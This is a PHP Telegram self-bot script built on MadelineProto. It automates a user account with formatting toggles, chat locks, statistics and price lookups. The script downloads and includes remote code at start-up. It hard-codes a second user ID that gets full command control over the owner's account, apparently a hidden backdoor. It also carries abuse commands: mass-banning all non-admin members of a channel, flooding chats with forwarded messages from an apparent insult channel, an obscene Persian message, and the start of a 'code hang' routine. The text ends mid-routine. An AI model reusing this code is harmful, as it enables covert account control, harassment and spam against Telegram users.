<?php
//By @Yasin_431
error_reporting(E_ALL);
ini_set('display_errors','1');
ini_set('memory_limit' , '-1');
ini_set('max_execution_time','0');
ini_set('display_startup_errors','1');

date_default_timezone_set('Asia/Tehran');

if (!is_dir('files')) {
    mkdir('files');
}
if (!file_exists('madeline.php') or filesize('madeline.php') < rand(1024, 2048)) {
    copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
}

include 'madeline.php';
include 'jdf.php';

use danog\Loop\Generic\GenericLoop;
use danog\MadelineProto\API;
use danog\MadelineProto\EventHandler;


function isJson($string)
{
    json_decode($string);
    if (json_last_error() == JSON_ERROR_NONE) {
        return true;
    } else {
        return false;
    }
}

function bioToCustom($text)
{
    $fonts = [["𝟶", "𝟷", "𝟸", "𝟹", "𝟺", "𝟻", "𝟼", "𝟽", "𝟾", "𝟿​"],
        ["⓪", "①", "②", "③", "④", "⑤", "⑥", "⑦", "⑧", "⑨"],
        ["⓿", "❶", "❷", "❸", "❹", "❺", "❻", "❼", "❽", "❾"],
        ["〔𝟘〕", "〔𝟙〕", "〔𝟚〕", "〔𝟛〕", "〔𝟜〕", "〔𝟝〕", "〔𝟞〕", "〔𝟟〕", "〔𝟠〕", "〔𝟡〕"],
        ["𝟘", "𝟙", "𝟚", "𝟛", "𝟜", "𝟝", " 𝟞", "𝟟", "𝟠", "𝟡"],
        ["𝟬", "𝟭", "𝟮", "𝟯", "𝟰", "𝟱", "𝟲", "𝟳", "𝟴", "𝟵"],
        ["─𝟎", "─𝟏", "─𝟐", "─𝟑", "─𝟒", "─𝟓", "─𝟔", "─𝟕", "─𝟖", "─𝟗"],
        ["𝟶", "҉1", "҉2", "҉3", "҉4", "҉5", "҉6", "҉7", "҉8", "҉9҉"]];
    $time2 = str_replace(range(0, 9), $fonts[array_rand($fonts)], date("H:i"));
    $param = str_replace('TIME', date('H:i'), $text);
    $param = str_replace('FTM', $time2, $param);
    $param = str_replace('DAYNAME', jdate('l'), $param);
    $param = str_replace('YEAR', jdate('y'), $param);
    $param = str_replace('MONTH', jdate('n'), $param);
    $param = str_replace('DAY', jdate('j'), $param);
    return $param;
}

function align(array $args, string $sep = ': ', string $prefix = '', string $suffix = '', bool $mb = false): string
{
    [$result, $maxLength, $method] = ['', 0, $mb ? 'mb_strlen' : 'strlen'];
    foreach ($args as $key => $val) {
        if ($method($key) > $maxLength) {
            $maxLength = $method($key);
        }
    }
    foreach ($args as $key => $val) {
        $result .= $prefix . $key . str_repeat(' ', $maxLength - $method($key)) . $sep . $val . $suffix . PHP_EOL;
    }
    return $result;
}

function bytesShortener($bytes, int $round = 0): string
{
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
    $index = 0;
    while ($bytes > 1024) {
        $bytes /= 1024;
        if (++$index === 8)
            break;
    }
    if ($round !== 0) {
        $bytes = round($bytes, $round);
    }
    return "$bytes {$units[$index]}";
}

function getCpuCores(): int
{
    return (int)(
    PHP_OS_FAMILY === 'Windows'
        ? getenv('NUMBER_OF_PROCESSORS')
        : substr_count(file_get_contents('/proc/cpuinfo'), 'processor')
    );
}

class XHandler extends EventHandler
{
    /*   const Admins = [904067273];
       const Report = 'PawnCoder';

       public function getReportPeers()
       {
           return [@Yasin_431];
       }*/

    public function onUpdateNewChannelMessage($update)
    {
        yield $this->onUpdateNewMessage($update);
    }

    public function onUpdateNewMessage($update)
    {
        if (time() - $update['message']['date'] > 2) {
            return;
        }
        try {
            $fromId = $update['message']['from_id']['user_id'] ?? 0;
            $text = $update['message']['message'] ?? null;
            $msg_id = $update['message']['id'] ?? 0;
            $message = isset($update['message']) ? $update['message'] : '';
            $MadelineProto = $this;
            $me = yield $this->getSelf();
            $owner = $me['id'];
            $Adminha = array($owner, 1703016137);
            $chID = yield $this->getInfo($update);
            $peer = yield $this->getID($update);
            $type3 = $chID['type'];
            $data = json_decode(yield $this->getLocalContents("data.json"), true);
            $step = $data['adminStep'];
            $load = sys_getloadavg();
            $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
            if (in_array($fromId, $Adminha)) {
                //	   if($from_id == $owner){
                if (!isset($update['message']['fwd_from']['_'])) {
                    $boldmode = yield $this->getLocalContents("bold.txt");
                    $mentionmode = yield $this->getLocalContents("mention.txt");
                    $mention2mode = yield $this->getLocalContents("mention2.txt");
                    $codingmode = yield $this->getLocalContents("coding.txt");
                    $strikethrough = yield $this->getLocalContents("strikethrough.txt");
                    $undermode = yield $this->getLocalContents("underline.txt");
                    $hashtagmode = yield $this->getLocalContents("hashtag.txt");
                    $partmode = yield $this->getLocalContents("part.txt");
                    $italic = yield $this->getLocalContents("italic.txt");
                    if (preg_match("/^[\/\#\!]?(bot) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(bot) (on|off)$/si", $text, $m);
                        $data['power'] = $m[2];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʙᴏᴛ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(poker) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(poker) (on|off)$/si", $text, $m);
                        $data['poker'] = $m[2];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴘᴏᴋᴇʀ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(bold) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(bold) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('bold.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʙᴏʟᴅ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(mention) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(mention) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('mention.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴍᴇɴᴛɪᴏɴ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(mention2) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(mention2) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('mention2.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴍᴇɴᴛɪᴏɴ2 ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(coding) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(coding) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('coding.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴄᴏᴅɪɴɢ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setlang) (en|fa)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setlang) (en|fa)$/si", $text, $m);
                        yield $this->filePutContents('language.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "𝐓𝐡𝐞 𝐥𝐚𝐧𝐠𝐮𝐚𝐠𝐞 𝐨𝐟 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐰𝐚𝐬 𝐬𝐞𝐭 𝐭𝐨 $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(strikethrough) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(strikethrough) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('strikethrough.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ꜱᴛʀɪᴋᴇᴛʜʀᴏᴜɢʜ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(underline) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(underline) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('underline.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴜɴᴅᴇʀʟɪɴᴇ ᴍᴏᴅᴇ ɴᴇᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(hashtag) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(hashtag) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('hashtag.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʜᴀꜱʜᴛᴀɢ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(part) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(part) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('part.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Pᴘᴀʀᴛ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockpv) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockpv) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockpv.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʟᴏᴄᴋ ᴘᴠ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(locklink) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(locklink) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('locklink.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʟᴏᴄᴋ ʟɪɴᴋ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockvia) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockvia) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockvia.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "LockVia Mode Now Is $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockphoto) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockphoto) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockphoto.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "LockPhoto Mode Now Is $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockmention) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockmention) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockmention.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "LockMention Mode Now Is $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockforward) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockforward) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockforward.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "lockforward Mode Now Is $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(locktag) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(locktag) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('locktag.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʟᴏᴄᴋ ᴛᴀɢ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockgp) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockgp) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockgp.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʟᴏᴄᴋ ɢᴘ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockmedia) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockmedia) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockmedia.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʟᴏᴄᴋ ᴍᴇᴅɪᴀ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(typing) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(typing) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('typing.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴛʏᴘɪɴɢ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(autochat) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(autochat) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('autochat.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴀᴜᴛᴏ ᴄʜᴀᴛ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(gameplay) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(gameplay) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('gameplay.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɢᴀᴍᴇᴘʟᴀʏ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(gamepv) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(gamepv) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('gamepv.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɢᴀᴍᴇᴘᴠ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(antilogin) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(antilogin) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('antilogin.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴀɴᴛɪʟᴏɢɪɴ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(audioaction) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(audioaction) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('audioaction.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴀᴜᴅɪᴏᴀᴄᴛɪᴏɴ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(videoaction) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(videoaction) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('videoaction.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴠɪᴅᴇᴏᴀᴄᴛɪᴏɴ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(markread) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(markread) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('markread.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴍᴀʀᴋʀᴇᴀᴅ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(italic) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(italic) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('italic.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɪᴛᴀʟɪᴄ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timename) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(timename) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('online.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴛɪᴍᴇɴᴀᴍᴇ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(enfont) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(enfont) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('enfont.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴇɴꜰᴏɴᴛ ᴍᴏᴅᴇ ɪꜱ ɴᴏᴡ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(fafont) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(fafont) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('fafont.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "FAꜰᴏɴᴛ ᴍᴏᴅᴇ ɪꜱ ɴᴏᴡ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timesticker) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(timesticker) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('timesticker.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴛɪᴍᴇꜱᴛɪᴄᴋᴇʀ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timepic) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(timepic) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('timepic.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴛɪᴍᴇᴘɪᴄ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timebio) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(timebio) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('timebio.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴛɪᴍᴇʙɪᴏ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match('/^[\/\#\!\.]?(status|وضعیت|وضع|مصرف|usage)$/si', $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ 𝑹𝒆𝒄𝒆𝒊𝒗𝒊𝒏𝒈** [𝒂𝒄𝒄𝒐𝒖𝒏𝒕](mention:$fromId) **𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏 ...!**", 'parse_mode' => 'Markdown']);
                        $chats = ['bot' => 0, 'user' => 0, 'chat' => 0, 'channel' => 0, 'supergroup' => 0];
                        foreach (yield $this->getDialogs() as $dialog) {
                            try {
                                $chats[yield $this->getInfo($dialog)['type']]++;
                            } catch (Throwable $e) {
                                $this->logger($e, Logger::ERROR);
                            }
                        }
                        $contacts = yield $this->contacts->getContacts()['contacts'];
                        $mutual = 0;
                        foreach ($contacts as $contact) {
                            if ($contact['mutual']) {
                                $mutual++;
                            }
                        }
                        $userStats =
                            "**Chats**\n"
                            . align(
                                [
                                    'Private' => $chats['user'],
                                    'Contact' => count($contacts),
                                    'Mutual Contact' => $mutual,
                                    'Group' => $chats['chat'],
                                    'Supergroup' => $chats['supergroup'],
                                    'Channel' => $chats['channel'],
                                    'Bot' => $chats['bot']
                                ],
                                ': ',
                                '`• ',
                                '`'
                            )
                            . "\n";
                        $serverStats =
                            "**Server**\n"
                            . align(
                                [
                                    'CPU cores' => getCpuCores(),
                                    'Robot mem usage' => bytesShortener(memory_get_usage(), 2),
                                    'Robot max mem usage' => bytesShortener(memory_get_peak_usage(), 2),
                                    'Allocated mem from sys' => bytesShortener(memory_get_usage(true), 2),
                                    'Max allocated mem from sys' => bytesShortener(memory_get_peak_usage(true), 2),
                                    'PHP version' => PHP_VERSION
                                ],
                                ': ',
                                '`• ',
                                '`'
                            );
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**Robot Statistics**\n\n" . ($userStats ?? '') . $serverStats, 'parse_mode' => 'Markdown']);

                    }
                    if (preg_match('/^[\/\#\!]?(restart|ریستارت)$/si', $text)) {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '**֍ Yasin self is Restarting...!**', 'reply_to_msg_id' => $msg_id, 'parse_mode' => 'Markdown']);;
                        yield $this->restart();
                    }
                    if (preg_match("/^[\/\#\!]?(check)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ Yasin** [self](mention:$fromId) **Checked**", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(bot|ربات)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ Yasin** [Self](mention:$fromId) **Bot is on**", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match('/^\/?(removemembers) (.*)$/si', $text, $m)) {
                        $num = 9999999;
						$channelParticipantsAdmins = ['_' => 'channelParticipantsAdmins'];
						$channelParticipantsBots = ['_' => 'channelParticipantsBots'];
						$admins = yield $this->channels->getParticipants(['channel' => $m[2], 'filter' => $channelParticipantsAdmins, 'offset' => 0, 'limit' => 25, 'hash' => [0], ]);
                        foreach ($admins['participants'] as $admin) {
                            $admineyaro[] = $admin['user_id'];
                        }
						$channelBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => -1];
                        $channelParticipantsRecent = ['_' => 'channelParticipantsRecent'];
                        $channels_ChannelParticipants = yield $this->channels->getParticipants(['channel' => $m[2], 'filter' => $channelParticipantsRecent, 'offset' => 0, 'limit' => 200, 'hash' => 0,]);
                        $userrs = $channels_ChannelParticipants['users'];
                        for ($i = 0; $i <= $num; $i++) {
                            $fonid = $userrs[$i]['id'];
                            $fon = $userrs[$i]['self'];
                            if ($fon == false && !in_array($fonid, $admineyaro)) {
                                yield $this->channels->editBanned([
                                    'channel' => $m[2],
                                    'user_id' => $fonid,
                                    'banned_rights' => $channelBannedRights]);
                            }
                        }
                    }
					
                    if ($text == 'فال' or $text == 'fall' or $text == 'omen') {
                        $link = json_decode(yield $this->fileGetContents("https://api.codebazan.ir/fal/?type=json"), true);
                        $fall = $link['Result'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
$fall
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
     "]);
                    }
                    if ($text == 'number' or $text == 'شمارش') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "１"]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "２", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "３", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "４", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "５", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "６", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "７", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "８", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "９", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "１０", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کص ننت بای😹🤘", 'id' => $msg_id + 1]);
                    }
                    if ($text == "for") {
                        foreach (range(2, 164) as $t) {
                            yield $this->sleep(1);
                            $rand = rand(1, 164);
                            yield $this->messages->forwardMessages(['from_peer' => "@pawnfosh", 'to_peer' => $peer, 'id' => [$rand],]);
                        }
                    }

                    if ($text == "قیمت طلا") {
                        $talaa = json_decode(yield $this->fileGetContents("https://r2f.ir/web/tala.php"), true);
                        //$talaa = json_decode(file_get_contents("https://amirmmdhaghi.oghab-host.xyz/api/tala.php"), true);
                        $tala = $talaa['4']['price'];
                        $nogre = $talaa['5']['price'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
🏵قیمت طلا و نقره به دلار :
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
🥇انس طلا : $tala

🥈انس نقره : $nogre
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
", 'parse_mode' => 'HTML']);
                    }

                    if ($text == "قیمت سکه") {
                        $talaa = json_decode(yield $this->fileGetContents("https://r2f.ir/web/tala.php"), true);
                        //$talaa = json_decode(file_get_contents("https://amirmmdhaghi.oghab-host.xyz/api/arz.php"), true);
                        $emami = $talaa['0']['price'];
                        $nim = $talaa['1']['price'];
                        $rob = $talaa['2']['price'];
                        $geram = $talaa['3']['price'];
                        $bahar = $talaa['6']['price'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
🏅قیمت سکه به تومان :
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
💰سکه گرمی : $geram

💰ربع سکه : $rob

💰نیم سکه : $nim

💰سکه بهار آزادی :  $bahar

💰سکه امامی : $emami
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
", 'parse_mode' => 'HTML']);
                    }

                    if ($text == "قیمت ارز") {
                        $arz = json_decode(yield $this->fileGetContents("https://r2f.ir/web/arz.php"), true);
                        $yoro = $arz['0']['price'];
                        $emarat = $arz['1']['price'];
                        $swead = $arz['2']['price'];
                        $norway = $arz['3']['price'];
                        $iraq = $arz['4']['price'];
                        $swit = $arz['5']['price'];
                        $armanestan = $arz['6']['price'];
                        $gorgea = $arz['7']['price'];
                        $pakestan = $arz['8']['price'];
                        $soudi = $arz['9']['price'];
                        $russia = $arz['10']['price'];
                        $india = $arz['11']['price'];
                        $kwait = $arz['12']['price'];
                        $astulia = $arz['13']['price'];
                        $oman = $arz['14']['price'];
                        $qatar = $arz['15']['price'];
                        $kanada = $arz['16']['price'];
                        $tailand = $arz['17']['price'];
                        $turkye = $arz['18']['price'];
                        $england = $arz['19']['price'];
                        $hong = $arz['20']['price'];
                        $azarbayjan = $arz['21']['price'];
                        $malezy = $arz['22']['price'];
                        $danmark = $arz['23']['price'];
                        $newzland = $arz['24']['price'];
                        $china = $arz['25']['price'];
                        $japan = $arz['26']['price'];
                        $bahrin = $arz['27']['price'];
                        $souria = $arz['28']['price'];
                        $dolar = $arz['29']['price'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
💵 قیمت ارز های کشور های مختلف:
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
🇪🇺 یورو : $yoro

🇺🇸 دلار : $dolar

🇦🇪درهم امارات  : $emarat

🇸🇪 کرون سوئد : $swead

🇳🇴 کرون نروژ : $norway

🇮🇶 دینار عراق : $iraq

🇨🇭فرانک سوئیس : $swit

🇦🇲 درام ارمنستان : $armanestan

🇬🇪لاری گرجستان : $gorgea

🇵🇰 روپیه پاکستان : $pakestan

🇷🇺 روبل روسیه : `$russia

🇮🇳 روپیه هندوستان : $india

🇰🇼 دینار کویت : $kwait

🇦🇺 دلار استرلیا : $astulia

🇴🇲 ریال عمان : $oman

🇶🇦 ریال قطر : $qatar

🇨🇦 دلار کانادا : $kanada

🇹🇭بات تایلند : $tailand

🇹🇷 لیر ترکیه : $turkye

🇬🇧 پوند انگلیس : $england

🇭🇰 دلار هنگ کنگ : $hong

🇦🇿 منات اذربایجان : $azarbayjan

🇲🇾رینگیت مالزی : $malezy

🇩🇰 کرون دانمارک : $danmark

🇳🇿 دلار نیوزلند : $newzland

🇨🇳 یوان چین : $china

🇯🇵 ین ژآپن : $japan

🇧🇭 دینار بحرین : $bahrin

🇸🇾 لیر سوریه : $souria
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
", 'parse_mode' => 'HTML']);
                    }

                    if ($text == "code hang") {
                        foreach (range(165, 182) as $t) {
                            yield $this->sleep(1);
                            $rand = rand(165, 182);
